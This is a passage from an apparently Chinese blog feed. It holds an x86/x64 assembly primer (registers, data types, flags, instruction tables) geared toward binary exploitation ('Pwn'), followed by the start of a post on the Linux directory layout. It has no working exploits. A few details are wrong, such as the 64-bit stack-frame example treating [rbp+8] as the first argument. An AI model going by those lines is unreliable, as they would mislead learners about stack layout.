80h</code></td><td><code>int $0x80</code></td></tr><tr><td><strong>内存数据传送到寄存器</strong></td><td><code>mov eax, [ecx]</code></td><td><code>movl (%ecx), %eax</code></td></tr><tr><td><strong>函数 &#x2F; 过程（sum 示例）</strong></td><td>sum:<br/>push ebp<br/>mov ebp, esp<br/>mov eax, [ebp+12]<br/>add eax, [ebp+8]<br/>pop ebp<br/>retn<br/></td><td>sum:<br/>pushl %ebp<br/>movl %esp, %ebp<br/>movl 12(%ebp), %eax<br/>addl 8(%ebp), %eax<br/>popl %ebp<br/>ret<br/></td></tr></tbody></table><h2 id="寄存器与数据类型"><a href="#寄存器与数据类型" class="headerlink" title="寄存器与数据类型"></a>寄存器与数据类型</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><table><thead><tr><th align="left"><strong>寄存器</strong></th><th align="left"><strong>位数</strong></th><th align="left"><strong>主要功能</strong></th><th align="left"><strong>特殊用途</strong></th><th align="left"><strong>子寄存器关系</strong></th></tr></thead><tbody><tr><td align="left"><strong>RAX</strong></td><td align="left">64-bit</td><td align="left">函数返回值、算术运算</td><td align="left">系统调用号(Syscall)</td><td align="left">RAX → EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>EAX</strong></td><td align="left">32-bit</td><td align="left">累加器、算术运算主存器</td><td align="left">乘法&#x2F;除法结果存储</td><td align="left">EAX → AX → AH&#x2F;AL</td></tr><tr><td align="left"><strong>AX</strong></td><td align="left">16-bit</td><td align="left">字乘法&#x2F;字除法&#x2F;字I&#x2F;O</td><td align="left">-</td><td align="left">AX → AH(高8位)&#x2F;AL(低8位)</td></tr><tr><td align="left"><strong>AL</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法&#x2F;字节I&#x2F;O 十进制运算</td><td align="left">BCD运算</td><td align="left">AX的低字节</td></tr><tr><td align="left"><strong>AH</strong></td><td align="left">8-bit</td><td align="left">字节乘法&#x2F;字节除法</td><td align="left">-</td><td align="left">AX的高字节</td></tr><tr><td align="left"><strong>RBX</strong></td><td align="left">64-bit</td><td align="left">通用数据存储</td><td align="left">内存寻址基址</td><td align="left">RBX → EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>EBX</strong></td><td align="left">32-bit</td><td align="left">内存寻址基址</td><td align="left">-</td><td align="left">EBX → BX → BH&#x2F;BL</td></tr><tr><td align="left"><strong>BX</strong></td><td align="left">16-bit</td><td align="left">内存指针</td><td align="left">段寄存器(DS)的默认基址</td><td align="left">BX → BH(高8位)&#x2F;BL(低8位)</td></tr><tr><td align="left"><strong>RCX</strong></td><td align="left">64-bit</td><td align="left">循环计数器</td><td align="left">REP前缀指令计数</td><td align="left">RCX → ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>ECX</strong></td><td align="left">32-bit</td><td align="left">循环计数器</td><td align="left">-</td><td align="left">ECX → CX → CH&#x2F;CL</td></tr><tr><td align="left"><strong>CX</strong></td><td align="left">16-bit</td><td align="left">串操作&#x2F;循环控制</td><td align="left">-</td><td align="left">CX → CH(高8位)&#x2F;CL(低8位)</td></tr><tr><td align="left"><strong>CL</strong></td><td align="left">8-bit</td><td align="left">移位&#x2F;旋转计数器</td><td align="left">位操作指令</td><td align="left">CX的低字节</td></tr><tr><td align="left"><strong>RDX</strong></td><td align="left">64-bit</td><td align="left">I&#x2F;O指针、数据存储</td><td align="left">除法余数存储</td><td align="left">RDX → EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>EDX</strong></td><td align="left">32-bit</td><td align="left">字乘法&#x2F;字除法 间接I&#x2F;O</td><td align="left">除法余数</td><td align="left">EDX → DX → DH&#x2F;DL</td></tr><tr><td align="left"><strong>DX</strong></td><td align="left">16-bit</td><td align="left">端口地址指针</td><td align="left">-</td><td align="left">DX → DH(高8位)&#x2F;DL(低8位)</td></tr><tr><td align="left"><strong>RSI</strong></td><td align="left">64-bit</td><td align="left">内存源指针</td><td align="left">串操作源地址</td><td align="left">RSI → ESI → SI</td></tr><tr><td align="left"><strong>ESI</strong></td><td align="left">32-bit</td><td align="left">内存源指针</td><td align="left">LODS&#x2F;MOVS等指令</td><td align="left">ESI → SI</td></tr><tr><td align="left"><strong>SI</strong></td><td align="left">16-bit</td><td align="left">串操作源指针</td><td align="left">DS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RDI</strong></td><td align="left">64-bit</td><td align="left">内存目的指针</td><td align="left">串操作目的地址</td><td align="left">RDI → EDI → DI</td></tr><tr><td align="left"><strong>EDI</strong></td><td align="left">32-bit</td><td align="left">内存目的指针</td><td align="left">STOS&#x2F;MOVS等指令</td><td align="left">EDI → DI</td></tr><tr><td align="left"><strong>DI</strong></td><td align="left">16-bit</td><td align="left">串操作目的指针</td><td align="left">ES段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RBP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">访问栈帧参数&#x2F;局部变量</td><td align="left">RBP → EBP → BP</td></tr><tr><td align="left"><strong>EBP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈基指针</strong></td><td align="left">函数栈帧基准</td><td align="left">EBP → BP</td></tr><tr><td align="left"><strong>BP</strong></td><td align="left">16-bit</td><td align="left">栈数据访问指针</td><td align="left">SS段偏移</td><td align="left">-</td></tr><tr><td align="left"><strong>RSP</strong></td><td align="left">64-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">当前栈顶位置</td><td align="left">RSP → ESP → SP</td></tr><tr><td align="left"><strong>ESP</strong></td><td align="left">32-bit</td><td align="left"><strong>栈顶指针</strong></td><td align="left">PUSH&#x2F;POP操作</td><td align="left">ESP → SP</td></tr><tr><td align="left"><strong>SP</strong></td><td align="left">16-bit</td><td align="left">栈顶指针</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left"><strong>RIP</strong></td><td align="left">64-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">存放下一条指令地址</td><td align="left">RIP → EIP → IP</td></tr><tr><td align="left"><strong>EIP</strong></td><td align="left">32-bit</td><td align="left"><strong>指令指针</strong></td><td align="left">控制程序执行流程</td><td align="left">EIP → IP</td></tr><tr><td align="left"><strong>IP</strong></td><td align="left">16-bit</td><td align="left">指令指针</td><td align="left">实模式下使用</td><td align="left">-</td></tr></tbody></table><h4 id="关键补充说明："><a href="#关键补充说明：" class="headerlink" title="关键补充说明："></a>关键补充说明：</h4><h5 id="寄存器层级关系："><a href="#寄存器层级关系：" class="headerlink" title="寄存器层级关系："></a>寄存器层级关系：</h5><ul><li>64位寄存器 (R开头)：<code>RAX</code>, <code>RBX</code>, <code>RCX</code>, <code>RDX</code>, <code>RSI</code>, <code>RDI</code>, <code>RBP</code>, <code>RSP</code>, <code>RIP</code></li><li>32位寄存器 (E开头)：<code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code>, <code>ESI</code>, <code>EDI</code>, <code>EBP</code>, <code>ESP</code>, <code>EIP</code></li><li>16位寄存器：<code>AX</code>, <code>BX</code>, <code>CX</code>, <code>DX</code>, <code>SI</code>, <code>DI</code>, <code>BP</code>, <code>SP</code>, <code>IP</code></li><li>8位寄存器：<code>AH</code>&#x2F;<code>AL</code>, <code>BH</code>&#x2F;<code>BL</code>, <code>CH</code>&#x2F;<code>CL</code>, <code>DH</code>&#x2F;<code>DL</code></li></ul><h5 id="Pwn-逆向中的核心寄存器："><a href="#Pwn-逆向中的核心寄存器：" class="headerlink" title="Pwn&#x2F;逆向中的核心寄存器："></a>Pwn&#x2F;逆向中的核心寄存器：</h5><ul><li><strong>RIP&#x2F;EIP</strong>：控制程序执行流（劫持核心目标）</li><li><strong>RSP&#x2F;ESP</strong>：栈指针（缓冲区溢出关键）</li><li><strong>RBP&#x2F;EBP</strong>：栈帧基准（定位局部变量&#x2F;参数）</li><li><strong>RAX&#x2F;EAX</strong>：存储系统调用号和函数返回值</li></ul><h5 id="特殊功能寄存器："><a href="#特殊功能寄存器：" class="headerlink" title="特殊功能寄存器："></a>特殊功能寄存器：</h5><ul><li><strong>段寄存器</strong>：CS（代码段）, DS（数据段）, SS（堆栈段）, ES&#x2F;FS&#x2F;GS（附加段）</li><li><strong>标志寄存器</strong>：EFLAGS&#x2F;RFLAGS（存储状态标志如ZF&#x2F;CF&#x2F;SF等）</li></ul><h5 id="寄存器使用场景："><a href="#寄存器使用场景：" class="headerlink" title="寄存器使用场景："></a>寄存器使用场景：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#函数调用示例</span><br><span class="line">push rbp            ; 保存调用者栈帧</span><br><span class="line">mov rbp, rsp        ; 建立新栈帧</span><br><span class="line">mov eax, [rbp+8]    ; 获取第一个参数</span><br><span class="line">add eax, [rbp+12]   ; 加上第二个参数</span><br><span class="line">pop rbp             ; 恢复栈帧</span><br><span class="line">ret                 ; 返回到RIP指向地址</span><br></pre></td></tr></table></figure><h5 id="64位与32位差异："><a href="#64位与32位差异：" class="headerlink" title="64位与32位差异："></a>64位与32位差异：</h5><ul><li>64位新增寄存器：R8-R15</li><li>调用约定变更：64位使用RCX&#x2F;RDX&#x2F;R8&#x2F;R9传参</li><li>内存寻址范围扩大：64位支持48位虚拟地址空间</li></ul><h5 id="栈帧："><a href="#栈帧：" class="headerlink" title="栈帧："></a>栈帧：</h5><p>一个栈帧就是保存一个函数的状态，简单来说就是一个函数所需要的栈空间.</p><p>rsp(栈顶寄存器) &#x2F;esp(栈指针寄存器)永远指向栈帧的栈顶，rbp(栈基寄存器)&#x2F;ebp(扩展基址指针寄存器)则永远指向栈帧的栈底,rip(程序计数寄存器)&#x2F;eip(指令指针寄存器)指向当前栈栈帧执行的命令。</p><p>栈从高地址向低地址开辟内存空间，所以低地址的是栈顶，而栈底的第一个栈帧在这里存放着我们的主函数的父函数，所以main函数并不是最栈顶的函数，main上面还会在编译过程中有一些库函数，但是他们并不会产生栈帧，因为栈先进后出的特性，所以当在main函数中需要调用其他函数时，就开辟一个新的函数栈帧，并存储上一个栈的栈底，当调用结束时，将现在的栈帧弹出，恢复到原来的main函数继续执行完main函数。</p><p><img src="/../../../../../images/image-20250630161338940.png" alt="image-20250630161338940"></p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h4><h5 id="表达方式："><a href="#表达方式：" class="headerlink" title="表达方式："></a>表达方式：</h5><table><thead><tr><th align="left"><strong>进制</strong></th><th align="left"><strong>前缀</strong></th><th align="left"><strong>示例</strong></th><th align="left">汇编表示</th></tr></thead><tbody><tr><td align="left"><strong>十进制</strong></td><td align="left">无</td><td align="left"><code>12345</code></td><td align="left"><code>mov eax, 12345</code></td></tr><tr><td align="left"><strong>十六进制</strong></td><td align="left"><code>0x</code></td><td align="left"><code>0xDEADBEEF</code></td><td align="left"><code>mov ebx, 0xDEADBEEF</code></td></tr><tr><td align="left"><strong>八进制</strong></td><td align="left"><code>0</code></td><td align="left"><code>0755</code></td><td align="left"><code>mov ecx, 0755</code></td></tr><tr><td align="left"><strong>二进制</strong></td><td align="left"><code>0b</code></td><td align="left"><code>0b10101010</code></td><td align="left"><code>mov dl, 0b10101010</code></td></tr></tbody></table><h5 id="内存存储（小端序）："><a href="#内存存储（小端序）：" class="headerlink" title="内存存储（小端序）："></a>内存存储（小端序）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">0x12345678</span>;  <span class="comment">// 32位整数</span></span><br><span class="line"><span class="comment">// 内存布局（地址递增）：</span></span><br><span class="line">Address: <span class="number">0x1000</span> → <span class="number">0x78</span></span><br><span class="line">Address: <span class="number">0x1001</span> → <span class="number">0x56</span></span><br><span class="line">Address: <span class="number">0x1002</span> → <span class="number">0x34</span></span><br><span class="line">Address: <span class="number">0x1003</span> → <span class="number">0x12</span></span><br></pre></td></tr></table></figure><h4 id="浮点数常量"><a href="#浮点数常量" class="headerlink" title="浮点数常量"></a>浮点数常量</h4><h5 id="IEEE-754标准："><a href="#IEEE-754标准：" class="headerlink" title="IEEE 754标准："></a>IEEE 754标准：</h5><table><thead><tr><th align="left"><strong>类型</strong></th><th align="left"><strong>总位数</strong></th><th align="left"><strong>符号位</strong></th><th align="left"><strong>指数位</strong></th><th align="left"><strong>尾数位</strong></th><th align="left"><strong>范围</strong></th><th align="left"><strong>示例</strong></th></tr></thead><tbody><tr><td align="left"><strong>float</strong></td><td align="left">32-bit</td><td align="left">1 bit</td><td align="left">8 bits</td><td align="left">23 bits</td><td align="left">±3.4e38</td><td align="left"><code>3.14f</code></td></tr><tr><td align="left"><strong>double</strong></td><td align="left">64-bit</td><td align="left">1 bit</td><td align="left">11 bits</td><td align="left">52 bits</td><td align="left">±1.7e308</td><td align="left"><code>2.71828</code></td></tr></tbody></table><h5 id="内存布局（float示例）："><a href="#内存布局（float示例）：" class="headerlink" title="内存布局（float示例）："></a>内存布局（float示例）：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> pi = <span class="number">3.14159</span>;  <span class="comment">// 十六进制: 0x40490FD0</span></span><br><span class="line"><span class="comment">// 内存结构（小端序）：</span></span><br><span class="line"><span class="number">0x0000</span>: D0  <span class="comment">// 尾数低位</span></span><br><span class="line"><span class="number">0x0001</span>: <span class="number">0F</span>  </span><br><span class="line"><span class="number">0x0002</span>: <span class="number">49</span>  <span class="comment">// 尾数高位 + 指数低位</span></span><br><span class="line"><span class="number">0x0003</span>: <span class="number">40</span>  <span class="comment">// 符号(0) + 指数高位</span></span><br></pre></td></tr></table></figure><h4 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h4><h5 id="内存表示："><a href="#内存表示：" class="headerlink" title="内存表示："></a>内存表示：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *str = <span class="string">&quot;Hello Pwn!&quot;</span>; </span><br><span class="line"><span class="comment">// 内存布局：</span></span><br><span class="line">Address: <span class="number">0x4000</span> → <span class="string">&#x27;H&#x27;</span> (<span class="number">0x48</span>)</span><br><span class="line">Address: <span class="number">0x4001</span> → <span class="string">&#x27;e&#x27;</span> (<span class="number">0x65</span>)</span><br><span class="line">...</span><br><span class="line">Address: <span class="number">0x4009</span> → <span class="string">&#x27;!&#x27;</span> (<span class="number">0x21</span>)</span><br><span class="line">Address: <span class="number">0x400A</span> → <span class="number">0x00</span>  <span class="comment">// NULL终止符</span></span><br></pre></td></tr></table></figure><h5 id="汇编定义："><a href="#汇编定义：" class="headerlink" title="汇编定义："></a>汇编定义：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &#x27;Hello Pwn!&#x27;, 0x0A, 0  ; 带换行符的字符串</span><br><span class="line">section .text</span><br><span class="line">    mov rsi, msg   ; 字符串地址 → RSI</span><br><span class="line">    mov rdx, 11    ; 长度(包括换行)</span><br><span class="line">    syscall        ; Linux写系统调用</span><br></pre></td></tr></table></figure><h2 id="标志位"><a href="#标志位" class="headerlink" title="标志位"></a>标志位</h2><p><strong>·进位标志CF(Carry Flag):</strong><br>进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高 位产生了一个进位或借位，那么，其值为1，否则其值为0。<br><strong>·奇偶标志PF(Parity Flag):</strong><br>奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值为1，否则其值为0。<br><strong>·辅助进位标志AF(Auxiliary Carry Flag)：</strong><br>在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0(在字操作时，发生低字节向高字节进位或借位时；在字节操作时，发生低4位向高4位进位或借位时)。<br><strong>·零标志ZF(ZeroFlag):</strong><br>零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br><strong>·符号标志SF(Sign Flag):</strong><br>符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1。<br><strong>·溢出标志OF(Overflow Flag):</strong><br>溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 </p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h3 id="常用指令表"><a href="#常用指令表" class="headerlink" title="常用指令表"></a>常用指令表</h3><table><thead><tr><th align="left"><strong>指令类型</strong></th><th align="left"><strong>指令</strong></th><th align="left"><strong>语法</strong></th><th align="left"><strong>功能描述</strong></th><th align="left"><strong>标志位影响</strong></th><th align="left"><strong>Pwn应用场景</strong></th></tr></thead><tbody><tr><td align="left"><strong>数据传送</strong></td><td align="left"><code>MOV</code></td><td align="left"><code>MOV 目标, 源</code></td><td align="left">将源操作数复制到目标</td><td align="left"><strong>无影响</strong></td><td align="left">构造ROP链、寄存器控制</td></tr><tr><td align="left"></td><td align="left"><code>LEA</code></td><td align="left"><code>LEA 目标, [内存]</code></td><td align="left">加载有效地址（不访问内存）</td><td align="left"><strong>无影响</strong></td><td align="left">计算地址绕过ASLR</td></tr><tr><td align="left"><strong>算术运算</strong></td><td align="left"><code>ADD</code></td><td align="left"><code>ADD 目标, 源</code></td><td align="left">目标 &#x3D; 目标 + 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">整数溢出漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>SUB</code></td><td align="left"><code>SUB 目标, 源</code></td><td align="left">目标 &#x3D; 目标 - 源</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">内存地址计算</td></tr><tr><td align="left"></td><td align="left"><code>INC</code></td><td align="left"><code>INC 目标</code></td><td align="left">目标 &#x3D; 目标 + 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">计数器修改</td></tr><tr><td align="left"></td><td align="left"><code>DEC</code></td><td align="left"><code>DEC 目标</code></td><td align="left">目标 &#x3D; 目标 - 1</td><td align="left"><strong>OF,SF,ZF</strong></td><td align="left">循环控制</td></tr><tr><td align="left"><strong>逻辑运算</strong></td><td align="left"><code>AND</code></td><td align="left"><code>AND 目标, 源</code></td><td align="left">目标 &#x3D; 目标 &amp; 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位掩码操作</td></tr><tr><td align="left"></td><td align="left"><code>OR</code></td><td align="left"><code>OR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 | 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">位设置</td></tr><tr><td align="left"></td><td align="left"><code>XOR</code></td><td align="left"><code>XOR 目标, 源</code></td><td align="left">目标 &#x3D; 目标 ^ 源</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">清零寄存器(<code>XOR EAX, EAX</code>)</td></tr><tr><td align="left"></td><td align="left"><code>NOT</code></td><td align="left"><code>NOT 目标</code></td><td align="left">目标 &#x3D; ~目标</td><td align="left"><strong>无影响</strong></td><td align="left">位翻转</td></tr><tr><td align="left"><strong>控制转移</strong></td><td align="left"><code>CALL</code></td><td align="left"><code>CALL 地址</code></td><td align="left">1. 压入返回地址 2. 跳转到目标地址</td><td align="left"><strong>无影响</strong></td><td align="left">函数调用劫持</td></tr><tr><td align="left"></td><td align="left"><code>RET</code></td><td align="left"><code>RET [n]</code></td><td align="left">1. 弹出返回地址 2. 跳转到该地址 3. 可选栈调整</td><td align="left"><strong>无影响</strong></td><td align="left">栈溢出利用</td></tr><tr><td align="left"></td><td align="left"><code>JMP</code></td><td align="left"><code>JMP 地址</code></td><td align="left">无条件跳转</td><td align="left"><strong>无影响</strong></td><td align="left">程序流劫持</td></tr><tr><td align="left"><strong>比较测试</strong></td><td align="left"><code>CMP</code></td><td align="left"><code>CMP 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 - 操作数2)</td><td align="left"><strong>CF,OF,SF,ZF</strong></td><td align="left">条件分支漏洞利用</td></tr><tr><td align="left"></td><td align="left"><code>TEST</code></td><td align="left"><code>TEST 操作数1, 操作数2</code></td><td align="left">设置标志位(操作数1 &amp; 操作数2)</td><td align="left"><strong>CF&#x3D;0,OF&#x3D;0,SF,ZF</strong></td><td align="left">权限检查绕过</td></tr><tr><td align="left"><strong>栈操作</strong></td><td align="left"><code>PUSH</code></td><td align="left"><code>PUSH 源</code></td><td align="left">1. ESP -&#x3D; 4&#x2F;8 2. [ESP] &#x3D; 源</td><td align="left"><strong>无影响</strong></td><td align="left">栈帧构造</td></tr><tr><td align="left"></td><td align="left"><code>POP</code></td><td align="left"><code>POP 目标</code></td><td align="left">1. 目标 &#x3D; [ESP] 2. ESP +&#x3D; 4&#x2F;8</td><td align="left"><strong>无影响</strong></td><td align="left">ROP gadget利用</td></tr><tr><td align="left"><strong>系统调用</strong></td><td align="left"><code>INT</code></td><td align="left"><code>INT n</code></td><td align="left">触发软件中断</td><td align="left"><strong>影响所有</strong></td><td align="left">系统调用利用</td></tr><tr><td align="left"></td><td align="left"><code>SYSCALL</code></td><td align="left"><code>SYSCALL</code></td><td align="left">快速系统调用</td><td align="left"><strong>影响所有</strong></td><td align="left">现代漏洞利用</td></tr></tbody></table><h3 id="关键指令深度解析"><a href="#关键指令深度解析" class="headerlink" title="关键指令深度解析"></a>关键指令深度解析</h3><h4 id="MOV-vs-LEA"><a href="#MOV-vs-LEA" class="headerlink" title="MOV vs LEA"></a>MOV vs LEA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; MOV - 内存访问</span><br><span class="line">mov eax, [ebx]   ; 将ebx指向的内存内容加载到eax</span><br><span class="line"></span><br><span class="line">; LEA - 不访问内存</span><br><span class="line">lea eax, [ebx+8] ; 计算地址值ebx+8并存入eax（不读取内存）</span><br></pre></td></tr></table></figure><p><strong>Pwn应用</strong>：LEA常用于计算地址偏移，绕过ASLR</p><h4 id="CMP与条件跳转"><a href="#CMP与条件跳转" class="headerlink" title="CMP与条件跳转"></a>CMP与条件跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp eax, 100     ; 比较eax和100</span><br><span class="line">jg  overflow     ; 若eax &gt; 100则跳转</span><br></pre></td></tr></table></figure><p><strong>标志位关系</strong>：</p><table><thead><tr><th align="left"><strong>跳转指令</strong></th><th align="left"><strong>含义</strong></th><th align="left"><strong>检查标志</strong></th></tr></thead><tbody><tr><td align="left"><code>JE/JZ</code></td><td align="left">相等&#x2F;零</td><td align="left">ZF&#x3D;1</td></tr><tr><td align="left"><code>JNE/JNZ</code></td><td align="left">不等&#x2F;非零</td><td align="left">ZF&#x3D;0</td></tr><tr><td align="left"><code>JG/JNLE</code></td><td align="left">大于</td><td align="left">ZF&#x3D;0且SF&#x3D;OF</td></tr><tr><td align="left"><code>JL/JNGE</code></td><td align="left">小于</td><td align="left">SF≠OF</td></tr></tbody></table><h4 id="CALL-RET-机制"><a href="#CALL-RET-机制" class="headerlink" title="CALL-RET 机制"></a>CALL-RET 机制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call func:   ; 相当于</span><br><span class="line">  push eip+5 ; 压入返回地址(下条指令)</span><br><span class="line">  jmp func</span><br><span class="line"></span><br><span class="line">ret:        ; 相当于</span><br><span class="line">  pop eip   ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong>：缓冲区溢出覆盖返回地址</p><h4 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 函数序言</span><br><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br><span class="line"></span><br><span class="line">; 函数尾声</span><br><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p><strong>Pwn意义</strong>：栈帧结构是缓冲区溢出的基础</p><h4 id="TEST指令妙用"><a href="#TEST指令妙用" class="headerlink" title="TEST指令妙用"></a>TEST指令妙用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test eax, eax  ; 检查eax是否为0</span><br><span class="line">jz   exit      ; 为零则跳转</span><br><span class="line"></span><br><span class="line">test al, 1     ; 检查最低位</span><br><span class="line">jnz  odd       ; 为奇数则跳转</span><br></pre></td></tr></table></figure><h3 id="汇编与高级语言的对应关系"><a href="#汇编与高级语言的对应关系" class="headerlink" title="汇编与高级语言的对应关系"></a>汇编与高级语言的对应关系</h3><p> C 语言与汇编（x86-64）的简单映射示例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> result = add(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; add函数</span><br><span class="line">add:</span><br><span class="line">    MOV EAX, ECX      ; 第一个参数(a)从ECX移入EAX</span><br><span class="line">    ADD EAX, EDX      ; EAX += 第二个参数(b)</span><br><span class="line">    RET               ; 返回EAX的值</span><br><span class="line"></span><br><span class="line">; main函数</span><br><span class="line">main:</span><br><span class="line">    MOV ECX, 3        ; 第一个参数3存入ECX</span><br><span class="line">    MOV EDX, 4        ; 第二个参数4存入EDX</span><br><span class="line">    CALL add          ; 调用add函数</span><br><span class="line">    XOR EAX, EAX      ; EAX = 0（返回值）</span><br><span class="line">    RET</span><br></pre></td></tr></table></figure><p>第一二章 前言-汇编的概念：<a href="http://fynote.com/s/3251">http://fynote.com/s/3251</a><br>第三章 寄存器：<a href="http://fynote.com/s/3269">http://fynote.com/s/3269</a><br>第四章 汇编程序：<a href="http://fynote.com/s/3315">http://fynote.com/s/3315</a><br>第五章 汇编指令：<a href="http://fynote.com/s/3354">http://fynote.com/s/3354</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 汇编基础 </category>
          
          <category> x86x64汇编基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux目录结构</title>
      <link href="/2025/06/e591376d054f.html"/>
      <url>/2025/06/e591376d054f.html</url>
      
        <content type="html"><![CDATA[<h1 id="根目录的子目录"><a href="#根目录的子目录" class="headerlink" title="根目录的子目录"></a>根目录的子目录</h1><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>bin是Binary的缩写, 这个目录存放着最经常使用的命令，由系统、系统管理员和用户共享</td></tr><tr><td>&#x2F;boot</td><td>这里存放的是启动Linux时使用的一些核心文件，包括一些链接文件以及镜像文件</td></tr><tr><td>&#x2F;dev</td><td>dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的</td></tr><tr><td>&#x2F;etc</td><td>大多数重要的系统配置文件都在&#x2F;etc目录下，该目录包含的数据类似于Windows控制面板中的数据</td></tr><tr><td>&#x2F;home</td><td>普通用户的家目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的</td></tr><tr><td>&#x2F;lib</td><td>库文件，包括系统和用户所需要的各种程序的文件</td></tr><tr><td>&#x2F;lost+found</td><td>每个分区在其上目录中都有一个lost+found。故障期间保存的文件在这里</td></tr><tr><td>&#x2F;media</td><td>linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下</td></tr><tr><td>&#x2F;mnt</td><td>外部文件系统的标准挂载点，例如CD-ROM(光驱)或数码相机</td></tr><tr><td>&#x2F;opt</td><td>通常包含额外的和第三方软件。这是给主机额外安装的大型应用程序所放置的目录</td></tr><tr><td>&#x2F;proc</td><td>包含有关系统资源信息的虚拟文件系统。这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件&lt;</td></tr><tr><td>&#x2F;root</td><td>该目录为系统管理员，也称作超级权限者的用户家目录。注意根目录 &#x2F; 和根用户的主目录 &#x2F;root 之间的区别</td></tr><tr><td>&#x2F;sbin</td><td>s就是Super User的意思，这里存放的是系统管理员root使用的系统管理程序</td></tr><tr><td>&#x2F;tmp</td><td>系统使用的临时空间，在重新启动时清理，所以不要使用它来保存任何工作!该目录对于所有用户都可以访问，不要把重要文件放置于该目录</td></tr><tr><td>&#x2F;usr</td><td>这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似与windows下的program files目录</td></tr><tr><td>&#x2F;var</td><td>用户创建的所有可变文件和临时文件的存储空间，如日志文件(一般是&#x2F;var&#x2F;log)、邮件队列、打印假脱机程序区、从Internet下载的文件的临时存储空间，或在刻录CD之前保存它的映像。</td></tr></tbody></table><h1 id="Linux绝对路径和相对路径"><a href="#Linux绝对路径和相对路径" class="headerlink" title="Linux绝对路径和相对路径"></a>Linux绝对路径和相对路径</h1><h2 id="绝对路径："><a href="#绝对路径：" class="headerlink" title="绝对路径："></a>绝对路径：</h2><p>以根目录“&#x2F;”开始的路径，表示从Linux目录结构的最顶点算起，特点是路径以“&#x2F;”开头</p><h2 id="相对路径："><a href="#相对路径：" 